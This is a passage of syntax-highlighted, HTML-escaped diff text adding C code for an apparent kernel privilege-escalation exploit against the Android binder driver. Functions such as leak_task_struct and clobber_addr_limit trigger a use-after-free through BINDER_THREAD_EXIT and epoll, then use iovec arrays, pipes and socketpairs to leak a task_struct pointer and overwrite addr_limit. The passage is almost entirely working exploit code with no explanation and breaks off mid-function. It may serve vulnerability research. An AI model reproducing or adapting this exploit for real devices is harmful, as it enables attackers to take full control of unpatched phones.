+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/prctl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/un.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define BINDER_THREAD_EXIT 0x40046208ul
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// NOTE: we don&amp;#39;t cover the task_struct* here; we want to leave it uninitialized
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BINDER_THREAD_SZ 0x190
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//25
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define WAITQUEUE_OFFSET 0xA0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hexdump_memory&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, size_t byte_count) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; byte_offset_start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (byte_count &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+    errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hexdump_memory called with non-full line&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; byte_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_offset_start; byte_offset &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; byte_offset_start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; byte_count;
+          byte_offset &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; line[&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;linep &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line;
+    linep &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; sprintf(linep, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%08lx  &amp;#34;&lt;/span&gt;, byte_offset);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+      linep &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; sprintf(linep, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%02hhx &amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)buf[byte_offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i]);
+    }
+    linep &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; sprintf(linep, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; |&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf[byte_offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i];
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (isalnum(c) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ispunct(c) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;) {
+        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(linep&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c;
+      } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(linep&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;;
+      }
+    }
+    linep &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; sprintf(linep, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|&amp;#34;&lt;/span&gt;);
+    puts(line);
+  }
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; epfd;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dummy_page_4g_aligned;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; current_ptr;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; binder_fd;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;leak_task_struct&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;epoll_event&lt;/span&gt; event &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { .events &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EPOLLIN };
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;epoll_add&amp;#34;&lt;/span&gt;);
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iovec&lt;/span&gt; iovec_array[IOVEC_ARRAY_SZ];
+  memset(iovec_array, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(iovec_array));
+
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dummy_page_4g_aligned; &lt;span style=&#34;color:#75715e&#34;&gt;/* spinlock in the low address half must be zero */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;next */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBEEF&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;prev */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;;
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b;
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (pipe(pipefd)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pipe&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fcntl(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], F_SETPIPE_SZ, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pipe size&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; page_buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;];
+  &lt;span style=&#34;color:#75715e&#34;&gt;//if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, &amp;#34;fill pipe&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  pid_t fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fork&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Child process */&lt;/span&gt;
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Doing EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#75715e&#34;&gt;// first page: dummy data
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], page_buffer, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read full pipe&amp;#34;&lt;/span&gt;);
+    close(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished write to FIFO.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+
+    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+  }
+  &lt;span style=&#34;color:#75715e&#34;&gt;//printf(&amp;#34;PARENT: Calling READV\n&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+  b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; writev(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], iovec_array, IOVEC_ARRAY_SZ);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;writev() returns 0x%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)b);
+  &lt;span style=&#34;color:#75715e&#34;&gt;// second page: leaked data
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], page_buffer, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read full pipe&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#75715e&#34;&gt;//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PARENT: Finished calling READV&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; status;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (wait(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;status) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; fork_ret) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wait&amp;#34;&lt;/span&gt;);
+
+  current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(page_buffer &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe8&lt;/span&gt;);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_ptr == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, current_ptr);
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clobber_addr_limit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;epoll_event&lt;/span&gt; event &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { .events &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EPOLLIN };
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;epoll_add&amp;#34;&lt;/span&gt;);
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iovec&lt;/span&gt; iovec_array[IOVEC_ARRAY_SZ];
+  memset(iovec_array, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(iovec_array));
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; second_write_chunk[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len */&lt;/span&gt;
+    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_base (already used) */&lt;/span&gt;
+    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len (already used) */&lt;/span&gt;
+    current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* next iov_base (addr_limit) */&lt;/span&gt;
+    &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* next iov_len (sizeof(addr_limit)) */&lt;/span&gt;
+    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffe&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;/* value to write */&lt;/span&gt;
+  };
+
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dummy_page_4g_aligned; &lt;span style=&#34;color:#75715e&#34;&gt;/* spinlock in the low address half must be zero */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;next */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBEEF&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;prev */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len of previous, then this element and next element */&lt;/span&gt;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xBEEFDEAD&lt;/span&gt;;
+  iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* should be correct from the start, kernel will sum up lengths when importing */&lt;/span&gt;
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (socketpair(AF_UNIX, SOCK_STREAM, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, socks)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;socketpair&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write socket dummy byte&amp;#34;&lt;/span&gt;);
+
+  pid_t fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fork&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Child process */&lt;/span&gt;
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Doing EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event);
